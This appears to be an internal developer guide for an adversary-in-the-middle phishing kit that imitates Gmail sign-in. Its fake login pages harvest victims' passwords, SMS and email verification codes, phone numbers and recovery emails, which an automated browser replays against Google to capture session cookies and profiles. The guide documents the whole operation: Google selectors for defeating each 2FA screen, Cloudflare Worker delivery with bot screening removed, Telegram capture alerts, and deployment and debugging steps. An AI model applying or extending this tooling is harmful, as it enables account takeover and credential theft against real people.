# Template ↔ Engine Protocol (Gmail-first)

Companion to `ARCHITECTURE.md` Flow 1 (cookie-api-login). This doc is the
**template surface** knowledge base: how login templates talk to the engine,
how to debug sessions automatically, and how to deploy template changes by
writing the template sheet directly. Gmail is documented end-to-end; section
10 is the checklist for adding the next niche.

Related: `tools/template-init.js` (verify-only session bootstrap — run it
first instead of re-discovering this doc), `tools/minify.js` (alternative
minifier, see §7).

---

## 1. System map

```
Browser (template page; fetched via the project's own Cloudflare Worker — §11 —
  │        which POSTs verifyPageVisit to the GAS /exec URL and renders
  │        projects.templateCode + injects userId)
  │ initialFormSubmission()
  │  POST {token, formData{email,password,strictly,ipData,deviceData}}
  ▼
Flask/Vercel  /api/notify-form-submission  →  GAS notifyFormSubmission
  →  Engine  POST /emails/cookie/cookie-api-login   (browserId created)
  │
  │  TEMPLATE POLL LOOP (every 2s, 600s cap):
  │  POST {browserId, token} → /emails/cookie/pooling-operator
  │    ← { currentStatus, engineProcessing, data: row }
  │  USER SUBMITS A FIELD:
  │  POST {browserId, token, updateType, <field>} → /emails/cookie/update-process
  │    → cache write + immediateFlush + wakeUp POST to cookie-api-login
  ▼
Engine drives the real provider page (Puppeteer), writes status +
lastJsonResponse to cache + cookie sheet; template re-renders per status.
COMPLETED/PROCESSING_FINALIZING → template redirects to landingPageLink.
```

Template sources of truth, in precedence order for a live page:

1. Master `template` tab, column `code` (source of truth — §2).
2. `projects.templateCode` (per-project copy; `{{placeholders}}` rendered by
   GAS at load — §6).
3. Repo files `gmail-serverless.html` (dev source) + `gmail-serverless.min.html`
   (deploy artifact, hand-mirrored — §7).

## 2. Spreadsheet identities

- **Master** (GAS `CONFIG.DB_ID`, `google-apps-script/POST.js:6`):
  `17cjaHx93z3ciGAdgJ4AvkjgIwI9gP3RsfJU5G7exp-U`
  WARNING: visually confusable `l`/`I` — the screenshot transcription
  `...lwl9...exp` (no `-U`) 404s. Always copy the POST.js constant.
- **Engine copy** (`DB_ID` in engine `.env`): different spreadsheet, auto-syncs
  from master. After any master write, re-read its `template` tab; mirror the
  write there too if diverged.
- `template` tab columns: `A id / B templateId / C category / D niche /
  E type / F name / G variables / H code`. Template HTML lives in **`H code`**.
- Gmail rows: **18 = tpt17 TRUE-LOGIN**, **19 = tpt18 COOKIE** (both carry the
  same minified shell; `G variables` holds per-type config), 17 = tpt16 PLAIN
  (separate file, do not touch for engine flows).
- `cookie` tab (sessions): `browserId(1) status(30) password(9)
  lastJsonResponse(29) lastUserActivity(37) verificationCode(27)
  verificationChoice(26) email(7) ...` — indexes are 1-based spreadsheet
  columns; there is NO `phoneNumber`/`recoveryEmail`/`phoneCountry*` column.
- `projects` tab: `templateCode(18)` + `templateId(12)/templateType(15)/
  templateTitle(14)/projectTitle(11)`.

## 3. Protocol contract

### update-process (`update-process/route.js`) — template → engine

`POST {browserId, token, updateType, ...}` (`application/x-www-form-urlencoded`).
Known `updateType` values (unknown types only refresh `lastUserActivity`):

| updateType | field(s) | notes |
|---|---|---|
| `email` | `email` (+optional `password`) | flips `WAITINGEMAILERROR`→`WAITINGEMAIL` |
| `password` | `password` | flips `WAITINGPASSWORDERROR`→`WAITINGPASSWORD` |
| `verificationChoice` | `verificationChoice` (JSON `[{choice}]`) | sets status `WAITINGOPTIONS` |
| `verificationCode` | `verificationCode` | 6-digit |
| `phoneNumber` | `phoneNumber` (E.164) + `phoneCountryDial` + `phoneCountryIso` | cache-only (§4) |
| `recoveryEmail` | `recoveryEmail` | cache-only (§4) |

Response `{success, engineProcessing:true, data: cachedRow}`. Template then
renders `PROCESSING` locally (`sendUpdate` → `updateUIForStatus('PROCESSING')`).

### Statuses (sheet form, no underscores)

`WAITING → WAITINGEMAIL(-ERROR) → WAITINGPASSWORD(-ERROR) → WAITINGCODE /
WAITINGOPTIONS / WAITINGRECOVERYEMAIL / WAITINGPHONENUMBER / WAITINGCAPTCHA →
PROCESSING → PROCESSING_FINALIZING/COMPLETED`, plus `FAILED`.
`pooling-operator` returns `engineProcessing=true` while: `activelyProcessing`
has the id, non-waiting status with a live job, `autoSubmittable`
(WAITINGPASSWORD + cached password / WAITINGEMAIL + cached email), or
`<8s since lastUserActivity` on pickup statuses. Template early-returns (no UI
update) while true, except the 180s PROCESSING watchdog.

### lastJsonResponse contract (JSON string)

- `status`: sheet form (`WAITING_CODE`, `WAITING_PHONE_NUMBER`, …).
- `verificationState`: underscore form; engine funnels
  `verificationState.replace(/_/g,'')` → sheet status (`route.js` requiresVerification funnel).
- `viewName`: screen identity the template keys copy off
  (`Gmail Phone Number Entry`, `Gmail SMS Code Entry`, …).
- `message`: user-facing or log text; templates show it for `*_ERROR` states.
- `smsDestination`: masked SMS target (`(567) 234-5678`) when known.
- `gmail`: phone-prompt meta (`{step:'waiting_app_notification', deviceName, instructions}`).
- `verificationOptions`: choice list for WAITINGOPTIONS.

### Template render rules (gmail-serverless)

- `pollOperator` (2s) → `updateUIForStatus(status, data)`. `statusChanged`
  drives full re-render; error blocks run **every** poll for the current
  status (never gate error display on `statusChanged`).
- New input group per status: hidden `<div>` + `hideAllErrors` ids +
  `hideInputGroups()` entry + `setFormSubmitting` input + case render +
  `handleFormSubmission` branch + `resetFormState`/`showFailedView` hides.
  Forgetting any one leaks chrome between views (seen 2026-10: stray Show
  password row).
- Error elements use the CSS `::before` badge (no inline SVGs — size).

## 4. State semantics (engine)

- `cookieCache.setCachedRow` merges arbitrary keys; `getCachedRow` is what
  pooling returns as `data`. `PRESERVE_KEYS` (survive `populateCache`
  sheet re-sync): email, password, username, verificationChoice,
  verificationCode, phoneNumber, phoneCountryDial, phoneCountryIso,
  recoveryEmail, lastUserActivity.
- `updateBrowserRowData` drops keys outside known cookie columns → phone /
  recovery values are **cache-only** (lost on engine restart mid-flow).
- `immediateFlush` strips `status` (engine owns transitions).
- Rejected credentials MUST be cleared in both cache and sheet at rejection
  time, or pooling reports `engineProcessing=true` and the template never
  renders the error (2026-10 password-error mask: `route.js` rejection
  `setCachedRow` + `updateBrowserRowData` include `password: ''`).
- `ACTIVE_STATUSES` (cookieCache) + `processable`/`inputWaitingStatuses`/
  `waitingStatuses` (pooling) + dispatch + finalizer lists (route.js) must ALL
  include any new WAITING* status or rows stall/timeout. The shared tail
  mapping (`!emailExists` → FAILED) must exempt every waiting state, or a
  phase-settled transition gets killed by a flag-less seed — and every
  phone/recovery transition payload must set `emailExists/accountAccess/
  requiresVerification` explicitly (spread does not guarantee them; the next
  invocation seeds `initialCheckResult` from the row payload).

## 5. Automation auth (the working recipe)

```js
const {web} = JSON5.parse(process.env.GOOGLE_OAUTH2_JSON); // {web:{client_id,client_secret}}
const client = new google.auth.OAuth2(web.client_id, web.client_secret);
client.setCredentials({refresh_token: process.env.GOOGLE_DRIVE_REFRESH_TOKEN});
await client.getAccessToken(); // then google.sheets({version:'v4',auth:client})
```

- Scopes: `https://www.googleapis.com/auth/spreadsheets` for writes,
  `.../spreadsheets.readonly` for verify tools.
- WARNING: `.env GOOGLE_SERVICE_ACCOUNT_KEY_STRING` PEM fails
  `crypto.createPrivateKey` (`DECODER unsupported`) — do not use it.
- PowerShell 5.1 notes: no `<` stdin redirect (pipe via
  `$script | node --input-type=commonjs -`); regexes with backslashes must be
  single-quoted; `Get-Content` misdecodes UTF-8/accented bytes on display —
  never trust PS output for exact-match strings, verify with char codes.
- Never print secret values — lengths, markers, booleans only.

## 6. Cell limit regime

- Google Sheets hard limit: **50,000 chars/cell**. Internal gate: **≤49,500**
  for the master cell, because `projects.templateCode` copies carry RENDERED
  values (`form_prj_…`, real URLs/token expand `{{placeholders}}` by ~+200).
- `{{formId}} {{token}} {{pollingUrl}} {{updateUrl}} {{landingPageLink}}`
  must survive every write (verify post-write).
- Proven size levers: drop `console.log` (keep `console.error`), inline SVGs
  → one CSS badge, per-case hide-lines → `hideInputGroups()` helper, dedupe
  repeated render code into helpers, decorative blocks need explicit approval
  (2026-10: 5.5KB phone illustration → emoji; dead `dontAskAgain` block
  removed; invisible `placeholder` attrs removed).
- Native elements over CDN dependencies: a CDN that fails client-side
  silently degrades the view (2026-10: intl-tel-input never executed despite
  being deployed → replaced with a native `<select>`).

## 7. Deploy workflow

1. Edit `gmail-serverless.html` (readable source).
2. Mirror to `gmail-serverless.min.html` in collapsed style (established
   convention; `tools/minify.js`+terser exists as an alternative but renames
   identifiers — do not mix methods in one deploy).
3. Gates (script-enforced before any write): min ≤49,500 · zero
   `console.log` · all five placeholders present · inline `<script>` parses
   (`node --input-type=commonjs --check`) · engine files parse
   (`--input-type=module --check`).
4. Verify target cells first (`template!A18:H19` → expect `tpt17`/`tpt18`,
   abort otherwise), then `values.update` (`valueInputOption:'RAW'`) H18+H19.
5. Re-read both cells: length ≤50,000 + markers (`#cardProgress{`,
   status cases, `{{formId}}`).
6. Check engine-copy `template` tab; mirror if diverged.
7. Reload the template in the browser (GAS renders on load — no re-paste).
8. `npx jest --testPathIgnorePatterns __test__/browser.test.js`
   (`browser.test.js` needs a real browser + external site; fails environmentally).
   `npm run lint` is broken pre-existing (missing `es-abstract` in node_modules).
9. Commit (descriptive title + bullet body) + push `main`.

## 8. Debug recipes

- **Which status/engine view?** `engine.log`: `Detected Google <view> page`,
  `Setting <STATUS>`, `Transitioned to <...>`, `WRONG_PASSWORD alert`,
  `already has the credential in cache. engineProcessing=true` (mask symptom),
  `poll gap … Holding session` (liveness holds, not fatal).
- **What does the template see?** read `cookie` row by `browserId`: `status`,
  `password` set?, decode `lastJsonResponse` → `verificationState/viewName/
  message/accountAccess`. Pooling returns the cache row verbatim as `data`.
- **Deployed vs repo drift?** compare cell vs repo file after normalizing
  `form_prj_[a-z0-9]+` → `{{formId}}`; report first diff offset.
- **Frozen template?** browser console: `Failed to fetch … pooling-operator`
  + CORS + `504 devtunnel` = **connectivity outage (tunnel/engine down)** —
  fix reachability, not code. Template stays on last known status while polls fail.
- **Template page 404s?** (edge layer, §11) `Server is temporarily
  unavailable` = worker's `/exec` POST returned non-JSON twice — run
  `testGasExecProbe` (expect `VERDICT: JSON OK`); `No active project matched
  the path` = path not in any ACTIVE `projects.urlPaths` (or a redirect path
  hit a template-kind worker); `Host mismatch with mainURL` = visitor host ≠
  project mainURL host.
- **Detection miss?** `checkVerification` order: `#phoneNumberId` probe →
  `#idvAnyPhonePin` probe → URL branches (`challenge/selection|prompt|as|dp|
  pwd|kpe|iap|ipe/verify|recaptcha-excluded|catch-all choice`) →
  `verificationScreens` loop (first match wins; phone entry sits before the
  CAPTCHA entry). Any new Google screen needs: selector → probe/screens entry
  → `text_input`/`code`/`choice` routing at ALL call sites (grep the
  `viewName`, never assume one site).

## 9. Gmail screen/selector registry (2026-10, extend here)

| Screen | Engine match | Type → status | Template |
|---|---|---|---|
| Password error | `loginFailed` xpath (`Wrong password…`) | → `WAITINGPASSWORD` + `WAITINGPASSWORD_ERROR` payload | error under field |
| Verification choices | option `li` (include `aria-disabled`/unavailable-note items with `disabled:true`, raw-position `choiceIndex`) | engine refuses disabled picks (stay + message); template greys them (no listeners) + single-vote lock (status/submitting/selected guards, catch unlock) |
| Phone number entry | `#phoneNumberId` (+ screens entry) | `text_input` → `WAITINGPHONENUMBER` | `phoneNumberGroup`: 15-country `<select>` (IP auto-select, manual guard), national digits, disclaimer, help link; submits E.164 + dial + ISO |
| SMS code entry | `#idvAnyPhonePin` (+ screens entry) | `code` → `WAITINGCODE`, `smsDestination` from `[jsname=wKtwcc]` | SMS notice copy + masked number |
| Tap-Yes / tap-number approval | `challenge/prompt|as|dp` + probes (`h2 span.imZuWd`, `samp[jsname=feLNVc]`, `.dMNVDae[jsname=NhJ5Dd]`, body-text fallbacks) | `phone_prompt` → `WAITINGCODE` + `gmail{deviceName, challengeNumber, promptInstructions, instructions}` | `phonePromptView` + `#phonePromptNumber` big numerals (hidden for plain tap-Yes); passive inbox wait |
| Text-or-Call choice | `#smsButton, #voiceButton` probe → `Gmail Text or Call Choice` | `choice` → options (`sms_text`/`voice_call` via `data-challengevariant`, `requiresInput` gated on `#iProofPhone` presence, labels via `innerText`) → click by id/text → existing destination arms | options list (disabled/lock apply); no new template view |
| Email code entry | `#idvPinId` | `code` → `WAITINGCODE`, `emailDestination` extracted (page-text regex) at ipe/verify + loop entries | email notice prefers page-extracted destination → options-label parse → entered-email mask |
| Code lockout | `codeLockout` xpath (`Too many attempts`) | real message to template | `InvalidVerificationCode` |
| Recovery email | `#knowledge-preregistered-email-response` (+ screens entry; URL probe wins over `challenge/kpe → password` — kpe serves BOTH password and recovery challenges, element decides) | `text_input` → `WAITINGRECOVERYEMAIL`, `recoveryMasked` from `.dMNVDae strong`; post-submit also routes phone view → `WAITINGPHONENUMBER`, submit-timeout probes screen before writing errors | `recoveryEmailGroup` + `#recoveryNotice` (masked sentence above field) + safety `#statement`; legends anchor to their own `fieldset` (`.field-group fieldset{position:relative}`) so leading notice/select blocks can't collide; value read **cache-first** (sheet has no column — sheet-only read never fires) |
| Phone submit (engine) | type national digits → `#phoneNumberId`, best-effort `#countryList` combobox by ISO→name map, click `#idvanyphonecollectNext` (Enter fallback) | post-submit: code→WAITINGCODE / choice→WAITINGOPTIONS / still-phone→stay+error | — |
| Code submit (engine) | `codeInputSelectors` chain incl. `smsCodeInput`, `codeSubmitSelectors` incl. `smsCodeSubmit` | — | — |
| Recovery-options Save | `handleAdditionalViews` text match `Make sure you can always sign in` / URL `gds.google.com/web/recoveryoptions`; click `button[aria-label="Save"]` → `button::-p-text("Save")` first (Cancel removed from Info-Setup view — never discard typed recovery email); Cancel kept only on discardable Options-Setup modals | retry-aware (`handledViews.add` only on successful click or after 3 failed attempts; 8s selector wait, not 3s) → silent SPA render race no longer permanently skips the view | — |
| Early FINALIZING signal | finalizer (`route.js` ~6703): intermediate `PROCESSING_FINALIZING` sheet write whenever `finalStatus === "PROCESSING_FINALIZING"` **or** `initialCheckResult.reachedInbox === true` — before browser close/staging/upload (same gate as `fullAccess`) | covers legacy `COMPLETED`-completion paths so the template redirects on inbox detection, not 30–90s later | `case 'PROCESSING_FINALIZING'` early redirect |
| No-code passive inbox detect | WAITINGCODE loop `else` branch (`route.js` ~6302, runs when `verificationCode` is null — phone-prompt tap-Yes flows): `isInbox` every 5s beat → full completion flow (cookies, close, upload, COMPLETED); every 6th beat `checkVerification` probe routes text_input→WAITINGPHONENUMBER/WAITINGRECOVERYEMAIL, choice→WAITINGOPTIONS; 5s sleep (kills prior busy-spin at ~110 iter/s) | fixes stuck-at-inbox-while-WAITINGCODE timeout: browser at `#inbox` for 9.5 min, no inbox check ever ran (passive branch was nested inside `if (codeEntryAttempted)` which is inside `if (verificationCode)`), template never got PROCESSING_FINALIZING | — |
| WAITINGPASSWORD resume fixes | processRow WAITINGPASSWORD entry (`route.js` ~3588): (a) removed early `activelyProcessing.add(browserId)` — pooling-operator computes `engineProcessing = activelyProcessing.has()` for input-waiting statuses, so the entry add pinned the template on "Checking..." (form never rendered; after a rejection the error message never returned); password-found path still adds at ~3693/3762. (b) `finalStatus` initialized to `"WAITINGPASSWORD"` (was left at processRow default `"FAILED"`) so the 5-min timeout path at ~4553 — gated on `finalStatus === "WAITINGPASSWORD"` — fires: closes browser, writes FAILED, uploads profile. Also added SIGKILL fallback after `browser.close()` timeout races (WAITINGPASSWORD timeout, 90s pre-upload, finally reused/non-reused) — no lingering Chrome after close hangs | fixes template stuck at "Checking..." on WAITINGPASSWORD (user can never enter password) + wrong-password error never rendering in template + 300s zombie browser loops (loop timed out but timeout-close was skipped because finalStatus was "FAILED" default; generic tail re-ran checkAccountAccess → re-set WAITINGPASSWORD → repeat until 12-min liveness cap) | — |
| WAITINGCODE final-status fixes | 4 inline-finalize paths (SAFETY_CHECK ~5706, VIEWS_CHECK ~5793, PASSIVE ~6003, NO_CODE_INBOX ~6381) closed the browser + uploaded inline + set only `updateData.status="COMPLETED"` but forgot `finalStatus="COMPLETED"` — `:6486` (`updateData.status = finalStatus`) clobbered COMPLETED back to PROCESSING_FINALIZING and `browserFullyClosed=true` skipped the main finalizer's PROCESSING_FINALIZING→COMPLETED conversion, so the terminal sheet write landed PROCESSING_FINALIZING + driveUrl (row orphaned forever: processWaitingRows skips PROCESSING_FINALIZING). Fixes: set `finalStatus="COMPLETED"` at all 4 sites (matching the correct ACCEPTED path ~6092) + central guard in the finally before the terminal write: `finalStatus==="PROCESSING_FINALIZING" && updateData.driveUrl` → COMPLETED (driveUrl-less PROCESSING_FINALIZING = upload still pending in background queue — untouched) | fixes rows stuck at PROCESSING_FINALIZING after a fully successful run (inbox reached, cookies + profile uploaded, row never flips to COMPLETED) — observed on browser-1791936627859-armw2aent4l and reproducible on every successful no-code/passive WAITINGCODE completion | — |
| Wrong-password template latency fix | engine `finally` stamps `globalThis.__engineFinishedAt[browserId]` next to `activelyProcessing.delete`; pooling-operator 8s anti-flash fallback (`enginePickupStatuses` branch) now requires `finishedAt <= lastUserActivity` — i.e. only pins when user activity is NEWER than the engine's last finish. The wrong-password handler stamps `lastUserActivity` on its own error write, which previously re-armed the fallback and held the template on "Checking..." ~8.7s after the engine was already done (Telegram WRONG_PASSWORD alert ~1s always beat the template) | error state written to cache+sheet at +0.1s, pin released at engine finish → template shows password form + error at next poll (~2–3s, poll-interval bound) instead of ~8.7s; anti-flash protection for template-POST→engine-pickup gaps preserved | — |

Country ISO map (template `data-iso` + engine `PHONE_COUNTRY_NAMES` — keep in
sync): us gb ca ng gh ke za in pk ph ae sa eg de fr (15; ES/IT dropped for the
50k budget). Option labels
are flag-emoji + dial (`🇺🇸 +1`, no country text — renders as letter-pairs on
Windows, still compact/disambiguated; no external assets allowed).
Inline field errors on phone/SMS screens live in `div[jsname=NuIDSd]` live
regions (`#c15` / `#c25` > `.Ekjuhf[jsname=B34EJ]`); engine reads them via
`readLiveRegionError` for exact template messages (phone stay-arm, SMS
wrong-code paths). WAITINGCODE resume re-probes the view so SMS copy can't
go stale.

## 10. Extension checklist (next niche/screen)

1. Capture real DOM (ids, error/callout patterns, Next-button id).
2. `platforms.js`: selectors + `verificationScreens` entry (order matters).
3. `routeHelper.js checkVerification`: probe before URL branches if the URL
   would misroute; return precise `viewName` (+ extras like destinations).
4. Route EVERY `checkVerification` call site by `type`+`viewName` (grep, incl.
   `checkAccountAccess` post-email/post-password/post-captcha/final,
   option-click, post-code, WAITING loops, passive probes). New WAITING*
   status → §4 lists + phase function + dispatch + pooling sets +
   `update-process` field + `PRESERVE_KEYS`.
5. Template: group + case + submit + errors + resets (checklist §3); SMS-style
   dynamic copy keyed off `viewName`/`smsDestination` pattern.
6. Gates (§7.3) → deploy H-cells → verify → tests → commit/push.
7. Append the screen to §9 with the real selectors.

## 11. Edge serving layer (WebFixx-Links — how templates reach the browser)

Templates are never served by Flask: every project/redirect link owns one
Cloudflare Worker (`worker.js` in `brentthopmson/WebFixx-Links`, fetched at
create time from `LINKS_REPO` settings row 14). Prefer row 14 =
`brentthopmson/WebFixx-Links` once the sync Action secrets are set (see the
syncWorkers bullet below); a fork (`web-fixx1/…`) only works if it contains
the latest `main` (`b24dd2d` or later) or every new/redeployed worker ships
stale code (no `CONFIG.kind`, no `/api` routes).

- **Serve path**: Worker → urlencoded `POST {action: verifyPageVisit,
  completeUrl, path, key, ipData}` → GAS `/exec` → `verifyPageVisit` matches
  `projects.urlPaths` → `{templateCode, userId}` → Worker renders HTML and
  injects `userId` into `verify-login…` URLs (`injectUserId`). Redirect
  clicks use `verifyRedirectVisit` (`redirect.paths` match + host check).
  Retry ×2; GAS delivery = **clasp push only** (`google-apps-script/` is
  git-ignored in WebFixx-Hoo).
- **/exec URL**: `settings!SCRIPT_EXEC_URL` (row 19) is the primary baked
  gasUrl — `cfResolveGasUrl()` (APP.js): row 19 first, else
  `ScriptApp.getService().getUrl()`, **`/exec` suffix enforced either way**.
  A `/dev` URL answers external worker POSTs with HTTP 401 + Google login
  HTML → `safeJson` null ×2 → worker 404 `Server is temporarily
  unavailable`. Verify with `testGasExecProbe` (UNIT_TEST.js) → expect
  `VERDICT: JSON OK`. Settings cache is 60s.
- **Routing (`CONFIG.kind`, baked per worker by `createCloudflareLink(
  nameHint, entityId, kind)`)**: `kind: "template"` (project) — bare `/<path>`
  and `/pageX` → template flow (ungated `verifyPageVisit`). `kind:
  "redirect"` — **every** bare path routes to the premium flow (full gating +
  `verifyRedirectVisit`) so `https://host/<urlPath>` serves the redirect;
  `/documentX|/directoryX|/directoriesX` premium, `/archiveX` captcha.
  Template flow has **no bot gating** (ipinfo/UA/IPHUB/AbuseIPDB removed
  2026-10); Turnstile gate only when settings row 18 is set.
- **Slash contract**: links are stored base-with-trailing-slash
  (`https://wf-….workers.dev/`) in `links.linkURL` / `links.redirectURL`
  (redirect!D spills from it — never scalar-write the redirect sheet).
  Joins: `buildPageUrl()` (APP.js: create, renew, acquireRedirect) and
  prefix-aware `generateFullPathURL` (PathsModal) — both concat
  `…/document`-style legacy bases **direct**, bare hosts get an inserted
  slash. `projects.mainURL` keeps the slash form so `${mainURL}${path}`
  stays correct.
- **Form submission (template → same origin `/api/*`)**: templates POST
  `notify-form-submission` / `pooling-operator` / `update-process` to
  `apiBaseUrl` = `templateConfig.pollingUrl || window.location.origin + '/api'`.
  The Worker proxies all three to GAS (`handleApi` in worker.js, Flask
  `api/index.py:61-98` parity): notify → `action: notifyFormSubmission`,
  retry until `apiResponse.browserId` else `{success:true, apiResponse:{}}`
  (120s timeout); pooling/update → `action: poolingOperator` (update-process
  really does map to poolingOperator — Flask quirk), 500 `{error}` on
  transient GAS. `/api/*` bypasses the Turnstile gate, the kind override and
  the premium rate limit; per-IP limits 10/min (notify) and 100/min (pooling).
  GAS never stamps `{{pollingUrl}}`/`{{updateUrl}}`, and an unreplaced
  `{{pollingUrl}}` is truthy → `apiBaseUrl` becomes the literal string →
  the browser 404s on a bogus relative path. `renderTemplateCode` now blanks
  leftovers via `blankPollingPlaceholders` (real vars replace first); probe
  with `testTemplatePlaceholderProbe` → expect
  `VERDICT: PLACEHOLDERS BLANK`. **Existing project rows keep their stored
  templateCode** — re-create/renew to pick up the blanked render.
- **Create/kill/redeploy**: `createCloudflareLink` PUTs the worker with
  secrets+kind injected (`cfConfigureWorkerSource`, unreplaced-placeholder
  check) and enables the route (log ends `route enabled, kind=…`);
  `killCloudflareLink` deletes one (404 = already dead = success).
  `redeployCloudflareWorker(linkUrl, kind)` re-uploads current source into
  the SAME worker name (taken from the URL) so sheet URLs stay valid — run it
  (`testRedeployKnownWorkers`) after any engine upgrade, instead of
  kill + re-create. Workers.dev subdomain resolves per account
  (`cfGetWorkersDevSubdomain`, currently `web-solution`).
- **Auto-sync (`syncWorkers`, APP.js)**: batch in-place redeploy of the
  current engine — full mode scans `links.linkURL` (template) +
  `redirect.link` (redirect) for `wf-*` names (deduped, 50-worker cap);
  `{projectId}` mode redeploys only that project's `mainURL` worker. Three
  triggers: (1) GitHub Action `.github/workflows/sync-workers.yml` in
  WebFixx-Links — every push to `main` touching `worker.js` +
  `workflow_dispatch` → POST `action=syncWorkers&key=` to the `/exec` URL
  (repo secrets `WF_GAS_URL`/`WF_SCRIPT_KEY`; script-key path via the
  `doPost` case); (2) admin card "Edge Workers" → *Sync all workers now* in
  WebFixx System Settings (`backendMultiFunction`, ADMIN role); (3)
  fire-and-forget `{projectId}` sync after every successful project-settings
  save (template vars, notifications, renewal, domain, redirect, notify
  toggle — helper `syncProjectWorker` in WebFixx `utils/syncWorker.ts`).
  Test from the Apps Script editor with `testSyncWorkers` → expect
  `VERDICT: SYNCED N/N`.
- **Error strings (worker parity)**: see §8 "Template page 404s?" —
  transient/exception strings live in `worker.js gasPost`/`handleTemplate`.
